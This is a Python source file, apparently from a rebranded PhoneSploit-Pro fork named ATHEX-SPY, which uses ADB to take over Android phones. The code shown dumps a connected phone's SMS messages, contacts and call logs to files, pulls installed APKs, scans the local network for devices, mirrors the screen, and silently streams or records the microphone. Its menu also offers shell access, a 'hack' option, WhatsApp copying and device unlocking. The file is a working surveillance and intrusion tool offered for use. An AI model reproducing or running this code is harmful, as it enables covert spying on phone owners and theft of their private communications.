    file_name = f"sms_dump-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.txt"
    os.system(
        f"adb shell content query --uri content://sms/ --projection address:date:body > {pull_location}/{file_name}"
    )


def dump_contacts():
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save Contacts file, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving Contacts file to PhoneSploit-Pro/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving Contacts file to {pull_location}\n\033[92m")
    print(f"\033[92m\nExtracting all Contacts\033[92m")

    instant = datetime.datetime.now()
    file_name = f"contacts_dump-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.txt"
    os.system(
        f"adb shell content query --uri content://contacts/phones/  --projection display_name:number > {pull_location}/{file_name}"
    )


def dump_call_logs():
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save Call Logs file, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving Call Logs file to PhoneSploit-Pro/{pull_location}\n\033[92m"
        )
    else:
        print(
            f"\n\033[95mSaving Call Logs file to {pull_location}\n\033[92m"
        )
    print(f"\033[92m\nExtracting all Call Logs\033[92m")

    instant = datetime.datetime.now()
    file_name = f"call_logs_dump-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.txt"
    os.system(
        f"adb shell content query --uri content://call_log/calls --projection name:number:duration:date > {pull_location}/{file_name}"
    )


def extract_apk():
    print(
        f"""
    \033[92m1.\033[92m Select from App List
    \033[92m2.\033[92m Enter Package Name Manually
    \033[92m"""
    )

    mode = input("> ")
    if mode == "1":
        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"\033[92m{i}.\033[92m {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if app.isdigit():
            if int(app) <= len(list) and int(app) > 0:
                package_name = list[int(app) - 1].replace("package:", "")
                print(
                    f"\n\033[91mExtracting \033[92m{package_name}\033[92m"
                )

            else:
                print(
                    f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
                )
                return
        else:
            print(
                f"\n\033[91m Expected an Integer Value\n\033[92m Going back to Main Menu\033[92m"
            )
            return

    elif mode == "2":
        ## OLD
        print(
            f"\n\033[96mEnter package name     \033[92mExample : com.spotify.music "
        )
        package_name = input("> ")

        if package_name == "":
            print(
                f"\n\033[91m Null Input\n\033[92m Going back to Main Menu\033[92m"
            )
            return
        print(f"\n\033[91mExtracting \033[92m{package_name}\033[92m")

    # If not returned then continue extraction
    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save APK file, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving APK file to PhoneSploit-Pro/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving APK file to {pull_location}\n\033[92m")

    print(f"\033[92m\nExtracting APK...\033[92m")

    try:
        path = os.popen(f"adb shell pm path {package_name}").read()
        path = path.replace("package:", "")
        os.system(f"adb pull {path}")
        file_name = package_name.replace(".", "_")
        # os.system(f'{move} base.apk {pull_location}/{file_name}.apk')
        os.rename("base.apk", f"{pull_location}/{file_name}.apk")

    except FileNotFoundError:
        print(f"\n\n\033[91m Error : \033[92mApp Not Found \033[92m\n")

    except FileExistsError:
        print(
            f"\n\n\033[91m Error : \033[92mAPK already exists in {pull_location} \033[92m\n"
        )
    print("\n")


def mirror():
    print(
        f"""
    \033[92m1.\033[92m Default Mode   \033[92m(Best quality)
    \033[92m2.\033[92m Fast Mode      \033[92m(Low quality but high performance)
    \033[92m3.\033[92m Custom Mode    \033[92m(Tweak settings to increase performance)
    \033[92m"""
    )
    mode = input("> ")
    if mode == "1":
        os.system("scrcpy")
    elif mode == "2":
        os.system("scrcpy -m 1024 -b 1M")
    elif mode == "3":
        print(f"\n\033[96mEnter size limit \033[92m(e.g. 1024)\033[92m")
        size = input("> ")
        if not size == "":
            size = "-m " + size

        print(
            f"\n\033[96mEnter bit-rate \033[92m(e.g. 2)   \033[92m(Default : 8 Mbps)"
        )
        bitrate = input("> ")
        if not bitrate == "":
            bitrate = "-b " + bitrate + "M"

        print(f"\n\033[96mEnter frame-rate \033[92m(e.g. 15)\033[92m")
        framerate = input("> ")
        if not framerate == "":
            framerate = "--max-fps=" + framerate

        os.system(f"scrcpy {size} {bitrate} {framerate}")
    else:
        print(
            f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
        )
        return
    print("\n")


def power_off():
    print(
        f"\n\033[91m[Warning]\033[92m Powering off device will disconnect the device\033[92m"
    )
    choice = input("\nDo you want to continue?     Y / N > ").lower()
    if choice == "y" or choice == "":
        pass
    elif choice == "n":
        return
    else:
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                pass
            elif choice == "n":
                return
    os.system(f"adb shell reboot -p")
    print("\n")


def update_me():
    print(f"\033[92m\nUpdating ATHEX-SPY\n\033[92m")
    print(f"\033[92mFetching latest updates from GitHub\n\033[92m")
    os.system("git fetch")
    print(f"\033[92m\nApplying changes\n\033[92m")
    os.system("git rebase")
    print(f"\033[96m\nPlease restart ATHEX-SPY\033[92m")
    exit_ATHEX_SPY()


def visit_me():
    os.system(f"{opener} https://github.com/Athexhacker/ATHEX-SPY")
    print("\n")


def scan_network():
    print(f"\n\033[92mScanning network for connected devices...\033[92m\n")
    ip = get_ip_address()
    ip += "/24"

    scanner = nmap.PortScanner()
    scanner.scan(hosts=ip, arguments="-sn")
    for host in scanner.all_hosts():
        if scanner[host]["status"]["state"] == "up":
            try:
                if len(scanner[host]["vendor"]) == 0:
                    try:
                        print(
                            f"[\033[92m+\033[92m] {host}      \t {socket.gethostbyaddr(host)[0]}"
                        )
                    except:
                        print(f"[\033[92m+\033[92m] {host}")
                else:
                    try:
                        print(
                            f"[\033[92m+\033[92m] {host}      \t {scanner[host]['vendor']}      \t {socket.gethostbyaddr(host)[0]}"
                        )
                    except:
                        print(
                            f"[\033[92m+\033[92m] {host}      \t {scanner[host]['vendor']}"
                        )
            except:
                print(
                    f"[\033[92m+\033[92m] {host}      \t {scanner[host]['vendor']}"
                )

    print("\n")


def record_audio(mode):
    print(
        f"\n\033[91m[Notice] \033[96mThis feature is currently available for devices running on Android 11 or higher only.\033[92m"
    )
    try:
        androidVersion = os.popen("adb shell getprop ro.build.version.release").read()
        android_os = int(androidVersion.split(".")[0])
        print(f"\n\033[92mDetected Android Version : {androidVersion}")
    except ValueError:
        print(
            f"\n\033[91m No connected device found\n\033[92m Going back to Main Menu\033[92m"
        )
        return

    if android_os < 11:
        print(f"\033[91mGoing back to Main Menu\033[92m")
        return

    global pull_location
    if pull_location == "":
        print(
            f"\n\033[92mEnter location to save Recordings, Press 'Enter' for default\033[92m"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n\033[95mSaving recordings to PhoneSploit-Pro/{pull_location}\n\033[92m"
        )
    else:
        print(f"\n\033[95mSaving recordings to {pull_location}\n\033[92m")

    match mode:
        case "mic":
            instant = datetime.datetime.now()
            file_name = f"mic-audio-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.opus"
            print(
                f"""
            \033[92m1.\033[92m Stream & Record   \033[92m
            \033[92m2.\033[92m Record Only     \033[92m(Fast)
            \033[92m"""
            )
            choice = input("> ")
            if choice == "1":
                print(
                    f"\n\033[92mRecording Microphone Audio \n\n\033[91mPress Ctrl+C to Stop.\n\033[92m"
                )
                os.system(
                    f"scrcpy --no-video --audio-source=mic --record={pull_location}/{file_name}"
                )
            elif choice == "2":
                print(
                    f"\n\033[92mRecording Microphone Audio \n\n\033[91mPress Ctrl+C to Stop.\n\033[92m"
                )
                os.system(
                    f"scrcpy --no-video --audio-source=mic --no-playback --record={pull_location}/{file_name}"
                )
            else:
                print(
                    f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
                )
                return

        case "device":
            instant = datetime.datetime.now()
            file_name = f"device-audio-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.opus"
            print(
                f"""
            \033[92m1.\033[92m Stream & Record   \033[92m
            \033[92m2.\033[92m Record Only     \033[92m(Fast)
            \033[92m"""
            )
            choice = input("> ")

            if choice == "1":
                print(
                    f"\n\033[92mRecording Device Audio \n\n\033[91mPress Ctrl+C to Stop.\n\033[92m"
                )
                os.system(f"scrcpy --no-video --record={pull_location}/{file_name}")

                # Asking to open file
                choice = input(
                    f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
                ).lower()
                if choice == "y" or choice == "":
                    os.system(f"{opener} {pull_location}/{file_name}")

                elif not choice == "n":
                    while choice != "y" and choice != "n" and choice != "":
                        choice = input("\nInvalid choice!, Press Y or N > ").lower()
                        if choice == "y" or choice == "":
                            os.system(f"{opener} {pull_location}/{file_name}")

            elif choice == "2":
                print(
                    f"\n\033[92mRecording Device Audio \n\n\033[91mPress Ctrl+C to Stop.\n\033[92m"
                )
                os.system(
                    f"scrcpy --no-video --no-playback --record={pull_location}/{file_name}"
                )

                # Asking to open file
                choice = input(
                    f"\n\033[92mDo you want to Open the file?     Y / N \033[92m> "
                ).lower()
                if choice == "y" or choice == "":
                    os.system(f"{opener} {pull_location}/{file_name}")

                elif not choice == "n":
                    while choice != "y" and choice != "n" and choice != "":
                        choice = input("\nInvalid choice!, Press Y or N > ").lower()
                        if choice == "y" or choice == "":
                            os.system(f"{opener} {pull_location}/{file_name}")

            else:
                print(
                    f"\n\033[91m Invalid selection\n\033[92m Going back to Main Menu\033[92m"
                )
                return
    print("\n")


def stream_audio(mode):
    print(
        f"\n\033[91m[Notice] \033[96mThis feature is currently available for devices running on Android 11 or higher only.\033[92m"
    )
    try:
        androidVersion = os.popen("adb shell getprop ro.build.version.release").read()
        android_os = int(androidVersion.split(".")[0])
        print(f"\n\033[92mDetected Android Version : {androidVersion}")
    except ValueError:
        print(
            f"\n\033[91m No connected device found\n\033[92m Going back to Main Menu\033[92m"
        )
        return

    if android_os < 11:
        print(f"\033[91mGoing back to Main Menu\033[92m")
        return

    match mode:
        case "mic":
            print(
                f"\n\033[92mStreaming Microphone Audio \n\n\033[91mPress Ctrl+C to Stop.\n\033[92m"
            )
            os.system("scrcpy --no-video --audio-source=mic")

        case "device":
            print(
                f"\n\033[92mStreaming Device Audio \n\n\033[91mPress Ctrl+C to Stop.\n\033[92m"
            )
            os.system("scrcpy --no-video")

    print("\n")


def main():
    # Clearing the screen and presenting the menu
    # taking selection input from user
    print(f"\n \033[96m99 : Clear Screen                0 : Exit")
    option = input(f"\n\033[91m[Main Menu] \033[92mEnter selection > ").lower()

    match option:
        case "p":
            change_page("p")
        case "n":
            change_page("n")
        case "release":
            from modules import release
        case "0":
            exit_ATHEX_SPY()
        case "99":
            clear_screen()
        case "1":
            connect()
        case "2":
            list_devices()
        case "3":
            disconnect()
        case "4":
            scan_network()
        case "5":
            mirror()
        case "6":
            get_screenshot()
        case "7":
            screenrecord()
        case "8":
            pull_file()
        case "9":
            push_file()
        case "10":
            launch_app()
        case "11":
            install_app()
        case "12":
            uninstall_app()
        case "13":
            list_apps()
        case "14":
            get_shell()
        case "15":
            hack()
        case "16":
            list_files()
        case "17":
            send_sms()
        case "18":
            copy_whatsapp()
        case "19":
            copy_screenshots()
        case "20":
            copy_camera()
        case "21":
            anonymous_screenshot()
        case "22":
            anonymous_screenrecord()
        case "23":
            open_link()
        case "24":
            open_photo()
        case "25":
            open_audio()
        case "26":
            open_video()
        case "27":
            get_device_info()
        case "28":
            battery_info()
        case "29":
            reboot("system")
        case "30":
            reboot("advanced")
        case "31":
            unlock_device()
        case "32":
            lock_device()
        case "33":
            dump_sms()
        case "34":
            dump_contacts()
        case "35":
            dump_call_logs()
        case "36":
            extract_apk()
        case "37":
            stop_adb()
        case "38":
            power_off()
        case "39":
            use_keycode()
        case "40":
            stream_audio("mic")
        case "41":
            record_audio("mic")
        case "42":
            stream_audio("device")
        case "43":
            record_audio("device")
        case "44":
            update_me()
        case "45":
            visit_me()
        case other:
            print("\nInvalid selection!\n")


# Starting point of the program

# Global variables
run_phonesploit_pro = True
operating_system = ""
clear = "clear"
opener = "xdg-open"
# move = 'mv'
page_number = 0
page = banner.menu[page_number]

# Locations
screenshot_location = ""
screenrecord_location = ""
pull_location = ""

# Concatenating banner color with the selected banner
selected_banner = "\033[92m" + random.choice(banner.banner_list)

start()

if run_phonesploit_pro:
    clear_screen()
    while run_phonesploit_pro:
        try:
            main()
        except KeyboardInterrupt:
            exit_ATHEX_SPY()